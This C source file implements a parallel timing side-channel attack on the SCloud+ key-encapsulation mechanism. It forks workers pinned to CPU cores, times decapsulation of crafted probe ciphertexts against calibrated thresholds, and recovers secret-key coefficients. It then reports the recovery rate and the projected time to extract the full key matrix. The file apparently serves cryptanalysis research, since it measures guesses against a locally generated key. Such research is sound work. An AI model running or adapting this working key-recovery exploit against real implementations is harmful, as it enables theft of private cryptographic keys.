/* PARALLEL end-to-end physical recovery (fork + shared memory).
 *
 * Same attack as recover_e2e.c, parallelised across physical cores:
 *   - PARENT does the one-time OFFLINE pk-only probe search (the ~10 min cost)
 *     and finds the known-bucket references. All of this lands in process memory.
 *   - fork() W workers; each inherits the probe table + sk + references via COW
 *     (read-only for workers, no IPC needed). Each worker pins itself to one
 *     physical core, RE-CALIBRATES gap/threshold on that core (so the threshold
 *     reflects the loaded, parallel condition), then processes its slice of the
 *     (coord,position) work list, timing scloud_kemdecaps and classifying buckets.
 *   - Per-coefficient results go to a shared mmap array; PARENT aggregates.
 *
 * This box: i7-9700, 8 physical cores, NO SMT. Cores used default to
 * {1,2,4,5,7,6} -- core0 (system/IRQ) and core3 (polarlac timing_attack_light)
 * are avoided. Measured: 5-core load raises core6 MAD only ~26% (5.0->6.3 us),
 * so parallel is safe here (independent cores, turbo off locks frequency).
 *
 * Args: [key_seed] [positions_per_coord] [N_shots] [N_cal] [max_tries] [coords]
 *       [nworkers] [clock]
 *   clock: 0=MONOTONIC (default here) 1=MONOTONIC_RAW
 */
#define _GNU_SOURCE
#define main recover_demo_unused_main
#include "recover_demo.c"
#undef main
#include <time.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>

/* ----- offline pk-only prediction & search (same as recover_e2e.c) ----- */
static size_t off_bucket(const uint8_t *pke_pk, const uint16_t *v,
                         unsigned target, unsigned a, int s)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    d[target] = (uint16_t)((int)v[target] - (int)a * s) & scloudplus_q_mask;
    uint8_t mu[scloudplus_ss];
    msg_decode(d, mu);
    size_t b, r; profile_message(pke_pk, mu, &b, &r);
    return b;
}
static int robust_ok(const uint16_t *v, unsigned i, unsigned a)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t m0[scloudplus_ss], mt[scloudplus_ss];
    memcpy(d, v, sizeof(uint16_t) * scloudplus_nbar);
    msg_decode(d, m0);
    for (unsigned j = 0; j < scloudplus_nbar; j++) {
        if (j == i) continue;
        for (int t = -1; t <= 1; t += 2) {
            uint16_t d2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
            memcpy(d2, v, sizeof(uint16_t) * scloudplus_nbar);
            d2[j] = (uint16_t)((int)v[j] - (int)a * t) & scloudplus_q_mask;
            msg_decode(d2, mt);
            if (memcmp(m0, mt, scloudplus_ss) != 0) return 0;
        }
    }
    return 1;
}

typedef struct {
    unsigned a; int delta; uint16_t v[scloudplus_nbar];
    size_t pb0[3], pb1[3];
    unsigned tries; int found;
} probe_t;

static probe_t search_probe(const uint8_t *pke_pk, unsigned i, unsigned max_tries)
{
    probe_t p; memset(&p, 0, sizeof(p));
    for (unsigned t = 1; t <= max_tries; t++) {
        static const unsigned amenu[] = {1,2,4,8,16};
        unsigned a = amenu[xr() % 5];
        int delta = ((int)(xr() % 2) ? +1 : -1);
        uint16_t v[scloudplus_nbar], vs[scloudplus_nbar];
        for (unsigned j = 0; j < scloudplus_nbar; j++)
            v[j] = (uint16_t)(((xr() % 16u) * 64u) & scloudplus_q_mask);
        memcpy(vs, v, sizeof(vs));
        vs[i] = (uint16_t)((vs[i] + delta + scloudplus_q) & scloudplus_q_mask);
        if (!robust_ok(v, i, a) || !robust_ok(vs, i, a)) continue;
        size_t b0[3], b1[3];
        for (int s = -1; s <= 1; s++) {
            b0[s+1] = off_bucket(pke_pk, v,  i, a, s);
            b1[s+1] = off_bucket(pke_pk, vs, i, a, s);
        }
        int d01 = (b0[0]!=b0[1]) || (b1[0]!=b1[1]);
        int d02 = (b0[0]!=b0[2]) || (b1[0]!=b1[2]);
        int d12 = (b0[1]!=b0[2]) || (b1[1]!=b1[2]);
        if (d01 && d02 && d12) {
            p.a=a; p.delta=delta; p.tries=t; p.found=1;
            memcpy(p.v, v, sizeof(v));
            memcpy(p.pb0, b0, sizeof(b0)); memcpy(p.pb1, b1, sizeof(b1));
            return p;
        }
    }
    p.tries = max_tries; p.found = 0; return p;
}

/* ----------------------- physical timing ----------------------- */
static clockid_t CLK = CLOCK_MONOTONIC;
static uint64_t mono_ns(void){ struct timespec t; clock_gettime(CLK,&t);
    return (uint64_t)t.tv_sec*1000000000ULL + (uint64_t)t.tv_nsec; }
static volatile uint8_t sink;
static double time_decaps(const uint8_t*sk,const uint8_t*ct){ uint8_t ss[scloudplus_ss];
    uint64_t a=mono_ns(); scloud_kemdecaps(sk,ct,ss); uint64_t b=mono_ns();
    sink^=ss[0]; return (double)(b-a); }
static int cmpd(const void*a,const void*b){ double x=*(const double*)a,y=*(const double*)b; return (x>y)-(x<y);}
static double med(double*x,unsigned n){ qsort(x,n,sizeof(double),cmpd);
    return n&1?x[n/2]:0.5*(x[n/2-1]+x[n/2]); }

static void build_probe_ct(const uint16_t *v, unsigned k, unsigned a, uint8_t *ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar]={0};
    c1[k]=(uint16_t)a; memcpy(c2,v,sizeof(v[0])*scloudplus_nbar);
    pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
static void build_ref_ct(const uint8_t*m,uint8_t*ct){
    uint16_t c1[(size_t)scloudplus_mbar*scloudplus_n]={0};
    uint16_t c2[(size_t)scloudplus_mbar*scloudplus_nbar];
    msg_encode(m,c2); pack_c1(c1,ct); pack_c2(c2,ct+scloudplus_c1);
}
static size_t real_bucket(const uint8_t*sk,const uint16_t*v,unsigned k,unsigned a){
    uint8_t ct[scloudplus_ctx],ss[scloudplus_ss];
    build_probe_ct(v,k,a,ct);
    generated_bytes=0; if(scloud_kemdecaps(sk,ct,ss)!=0) _exit(3);
    return generated_bytes/544;
}

/* work item + shared result slot */
typedef struct { unsigned coord, pos; } item_t;
typedef struct {
    int true_v, guess;
    unsigned char tb, ts, nb, ns;  /* timed/noiseless buckets (base,shift) */
    unsigned char done;
} res_t;

static int pin_core(int core){
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(core,&set);
    return sched_setaffinity(0,sizeof(set),&set);
}

int main(int argc,char**argv){
    if(argc>1) krng=strtoull(argv[1],0,10)|1ULL;
    const unsigned per_coord=argc>2?(unsigned)strtoul(argv[2],0,10):16U;
    const unsigned N        =argc>3?(unsigned)strtoul(argv[3],0,10):160U;
    const unsigned Ncal     =argc>4?(unsigned)strtoul(argv[4],0,10):3000U;
    const unsigned max_tries=argc>5?(unsigned)strtoul(argv[5],0,10):300000U;
    const unsigned ncoord   =argc>6?(unsigned)strtoul(argv[6],0,10):scloudplus_nbar;
    unsigned nworkers       =argc>7?(unsigned)strtoul(argv[7],0,10):6U;
    if(argc>8 && strtoul(argv[8],0,10)==1) CLK=CLOCK_MONOTONIC_RAW;

    /* cores to use: avoid 0 (system) and 3 (polarlac). order puts the under-test
     * core 6 last so single-worker runs land on the characterised core. */
    static const int CORES[] = {1,2,4,5,7,6};
    const unsigned NCORES = sizeof(CORES)/sizeof(CORES[0]);
    if(nworkers>NCORES) nworkers=NCORES;
    if(nworkers<1) nworkers=1;

    uint8_t pk[scloudplus_pk],sk[scloudplus_kem_sk];
    if(scloud_kemkeygen(pk,sk))return 1;
    const uint8_t*pke_pk=sk+scloudplus_pke_sk;
    static uint16_t S[(size_t)scloudplus_n*scloudplus_nbar]; unpack_sk(sk,S);
    memo=calloc(MEMO_SLOTS,sizeof(*memo)); if(!memo)return 1;

    fprintf(stderr,"clock=%s workers=%u cores=",
            CLK==CLOCK_MONOTONIC_RAW?"RAW":"MONOTONIC",nworkers);
    for(unsigned w=0;w<nworkers;w++) fprintf(stderr,"%d%s",CORES[w],w+1<nworkers?",":"\n");

    /* ---- OFFLINE pk-only probe search, PARALLELISED across workers ----
     * pr[] lives in shared memory; fork W workers, each pins a core and
     * searches its round-robin slice of coords, writing results back.
     * parent wait() is the barrier before the physical phase. */
    probe_t*pr=mmap(NULL,sizeof(probe_t)*scloudplus_nbar,PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(pr==MAP_FAILED){perror("mmap pr");return 3;}
    memset(pr,0,sizeof(probe_t)*scloudplus_nbar);

    char cache_fn[64]; snprintf(cache_fn,sizeof(cache_fn),"probe-cache-%llx.bin",
                                (unsigned long long)krng);
    int cached=0;
    { FILE*cf=fopen(cache_fn,"rb");
      if(cf){ fseek(cf,0,SEEK_END); long sz=ftell(cf); fseek(cf,0,SEEK_SET);
        if(sz==(long)(sizeof(probe_t)*ncoord)){
            if(fread(pr,sizeof(probe_t),ncoord,cf)==ncoord) cached=1; }
        fclose(cf); } }
    if(cached){
        fprintf(stderr,"probe cache loaded from %s\n",cache_fn);
        for(unsigned i=0;i<ncoord;i++)
            fprintf(stderr,"  coord %2u: %s a=%2u delta=%+d (%u tries)\n",
                    i,pr[i].found?"FOUND":"FAIL ",pr[i].a,pr[i].delta,pr[i].tries);
    } else {
    uint64_t ot0=mono_ns();
    for(unsigned w=0;w<nworkers;w++){
        pid_t pid=fork();
        if(pid<0){perror("fork");return 4;}
        if(pid==0){
            pin_core(CORES[w]);
            for(unsigned i=w;i<ncoord;i+=nworkers){
                probe_t best; memset(&best,0,sizeof(best)); best.found=0;
                for(unsigned att=0; att<4 && !best.found; att++){
                    rng = 0x2545f4914f6cdd1dULL
                        ^ (0x9e3779b97f4a7c15ULL*(uint64_t)(w+1))
                        ^ (0xbf58476d1ce4e5b9ULL*(uint64_t)(att+1)*(uint64_t)(i+1));
                    best = search_probe(pke_pk,i,max_tries);
                }
                pr[i]=best;
            }
            _exit(0);
        }
    }
    for(unsigned w=0;w<nworkers;w++) wait(NULL);
    for(unsigned i=0;i<ncoord;i++)
        fprintf(stderr,"  coord %2u: %s a=%2u delta=%+d (%u tries)\n",
                i,pr[i].found?"FOUND":"FAIL ",pr[i].a,pr[i].delta,pr[i].tries);
    fprintf(stderr,"offline search (parallel): %.1f s\n",(double)(mono_ns()-ot0)/1e9);
    FILE*cf=fopen(cache_fn,"wb");
    if(cf){ fwrite(pr,sizeof(probe_t),ncoord,cf); fclose(cf);
            fprintf(stderr,"probe cache written to %s\n",cache_fn); }
    } /* end !cached */

    /* ---- references (pk-only), built once, inherited by workers ---- */
    static uint8_t m_lo[scloudplus_ss]={0},m_hi[scloudplus_ss]={0}; int hl=0,hh=0;
    for(unsigned c=0;c<200000&&!(hl&&hh);c++){ uint8_t m[scloudplus_ss]={0};
        for(unsigned j=0;j<8;j++)m[j]=(uint8_t)(c>>(8*j));
        size_t b,r; profile_message(pke_pk,m,&b,&r);
        if(b==53&&!hl){memcpy(m_lo,m,sizeof(m));hl=1;}
        if(b==54&&!hh){memcpy(m_hi,m,sizeof(m));hh=1;} }
    if(!hl||!hh){fprintf(stderr,"no refs\n");return 2;}
    static uint8_t ct_lo[scloudplus_ctx],ct_hi[scloudplus_ctx];
    build_ref_ct(m_lo,ct_lo); build_ref_ct(m_hi,ct_hi);

    /* ---- build flat work list ---- */
    unsigned step=scloudplus_n/per_coord; if(!step)step=1;
    size_t cap=(size_t)ncoord*per_coord+ncoord, nit=0;
    item_t*items=malloc(sizeof(item_t)*cap);
    for(unsigned i=0;i<ncoord;i++){ if(!pr[i].found) continue;
        for(unsigned k=0;k<scloudplus_n;k+=step){ items[nit].coord=i; items[nit].pos=k; nit++; } }

    /* shared result array (visible to all workers) */
    res_t*res=mmap(NULL,sizeof(res_t)*nit,PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(res==MAP_FAILED){perror("mmap");return 3;}
    memset(res,0,sizeof(res_t)*nit);
    /* shared per-worker calibrated gap, for reporting */
    double*wgap=mmap(NULL,sizeof(double)*nworkers,PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_ANONYMOUS,-1,0);

    fprintf(stderr,"work items=%zu, dispatching to %u workers...\n",nit,nworkers);
    uint64_t w0=mono_ns();

    for(unsigned w=0;w<nworkers;w++){
        pid_t pid=fork();
        if(pid<0){perror("fork");return 4;}
        if(pid==0){
            /* ---- WORKER ---- */
            pin_core(CORES[w]);
            /* own RNG stream so interleave coin differs per worker */
            rng = 0x243f6a8885a308d3ULL ^ (0x9e3779b97f4a7c15ULL*(w+1));
            double*cal=malloc(sizeof(double)*Ncal);
            for(unsigned i=0;i<200;i++){(void)time_decaps(sk,ct_lo);(void)time_decaps(sk,ct_hi);}
            for(unsigned i=0;i<Ncal;i++){ double thi,tlo;
                if(xr()&1){thi=time_decaps(sk,ct_hi);tlo=time_decaps(sk,ct_lo);}
                else      {tlo=time_decaps(sk,ct_lo);thi=time_decaps(sk,ct_hi);}
                cal[i]=thi-tlo; }
            double gap=med(cal,Ncal), thr=gap/2.0; free(cal);
            wgap[w]=gap;
            double*db=malloc(sizeof(double)*N),*ds=malloc(sizeof(double)*N);
            double*tmp=malloc(sizeof(double)*N);
            for(size_t it=w; it<nit; it+=nworkers){   /* round-robin slice */
                unsigned i=items[it].coord, k=items[it].pos;
                probe_t*p=&pr[i];
                uint16_t vs[scloudplus_nbar]; memcpy(vs,p->v,sizeof(vs));
                vs[i]=(uint16_t)((vs[i]+p->delta+scloudplus_q)&scloudplus_q_mask);
                uint8_t ctb[scloudplus_ctx],cts[scloudplus_ctx];
                build_probe_ct(p->v,k,p->a,ctb); build_probe_ct(vs,k,p->a,cts);
                for(unsigned t=0;t<N;t++){ double tp,tr;
                    if(xr()&1){tp=time_decaps(sk,ctb);tr=time_decaps(sk,ct_lo);}
                    else      {tr=time_decaps(sk,ct_lo);tp=time_decaps(sk,ctb);}
                    db[t]=tp-tr; }
                for(unsigned t=0;t<N;t++){ double tp,tr;
                    if(xr()&1){tp=time_decaps(sk,cts);tr=time_decaps(sk,ct_lo);}
                    else      {tr=time_decaps(sk,ct_lo);tp=time_decaps(sk,cts);}
                    ds[t]=tp-tr; }
                memcpy(tmp,db,sizeof(double)*N); double mb=med(tmp,N);
                memcpy(tmp,ds,sizeof(double)*N); double ms=med(tmp,N);
                size_t tb=mb>thr?54:53, ts=ms>thr?54:53;
                size_t nb=real_bucket(sk,p->v,k,p->a), ns=real_bucket(sk,vs,k,p->a);
                int guess=99;
                for(int g=-1;g<=1;g++) if(p->pb0[g+1]==tb&&p->pb1[g+1]==ts) guess=g;
                res[it].true_v=center(S[(size_t)i*scloudplus_n+k]);
                res[it].guess=guess; res[it].tb=tb; res[it].ts=ts;
                res[it].nb=nb; res[it].ns=ns; res[it].done=1;
                fprintf(stderr,"  [w%u] %zu/%zu coord=%u pos=%u true=%+d guess=%+d %s\n",
                        w,it+1,nit,i,k,res[it].true_v,guess,
                        guess==res[it].true_v?"OK":"MISS");
            }
            free(db);free(ds);free(tmp);
            _exit(0);
        }
    }
    for(unsigned w=0;w<nworkers;w++) wait(NULL);
    double wall=(double)(mono_ns()-w0)/1e9;

    /* ---- aggregate ---- */
    printf("coord,position,true,guess,tb_base,tb_shift,nb_base,nb_shift,channel_ok,recover_ok\n");
    unsigned long tot=0,ch=0,rec=0,nz=0,nzok=0,undone=0;
    for(size_t it=0; it<nit; it++){
        if(!res[it].done){undone++; continue;}
        int cok=(res[it].tb==res[it].nb)&&(res[it].ts==res[it].ns);
        int rok=(res[it].guess==res[it].true_v);
        tot++; ch+=cok; rec+=rok; if(res[it].true_v){nz++;nzok+=rok;}
        printf("%u,%u,%d,%d,%u,%u,%u,%u,%d,%d\n",items[it].coord,items[it].pos,
               res[it].true_v,res[it].guess,res[it].tb,res[it].ts,
               res[it].nb,res[it].ns,cok,rok);
    }
    fflush(stdout);
    fprintf(stderr,"\nper-worker calibrated gap (ns):");
    for(unsigned w=0;w<nworkers;w++) fprintf(stderr," %.0f",wgap[w]);
    fprintf(stderr,"\n");
    double per_decaps=tot?wall/(double)(tot*((size_t)N*2+2)):0;
    fprintf(stderr,"PARALLEL recovery: coeffs=%lu (undone=%lu), N=%u, workers=%u\n",tot,undone,N,nworkers);
    fprintf(stderr,"  CHANNEL  %lu/%lu = %.1f%%\n",ch,tot,tot?100.0*ch/tot:0);
    fprintf(stderr,"  RECOVERY %lu/%lu = %.1f%%  [all-zero baseline %.1f%%]\n",
            rec,tot,tot?100.0*rec/tot:0,tot?100.0*(tot-nz)/tot:0);
    if(nz)fprintf(stderr,"  nonzero  %lu/%lu = %.1f%%\n",nzok,nz,100.0*nzok/nz);
    fprintf(stderr,"  wall %.1fs for %lu coeffs => %.3f s/coef (parallel); per-decaps~%.3f ms\n",
            wall,tot,tot?wall/tot:0,per_decaps*1e3);
    fprintf(stderr,"  projected full matrix (13024): %.2f h = %.2f days (at this width)\n",
            tot?(wall/tot)*13024/3600.0:0,tot?(wall/tot)*13024/86400.0:0);
    free(items); free(memo);
    munmap(res,sizeof(res_t)*nit); munmap(wgap,sizeof(double)*nworkers);
    munmap(pr,sizeof(probe_t)*scloudplus_nbar);
    return 0;
}
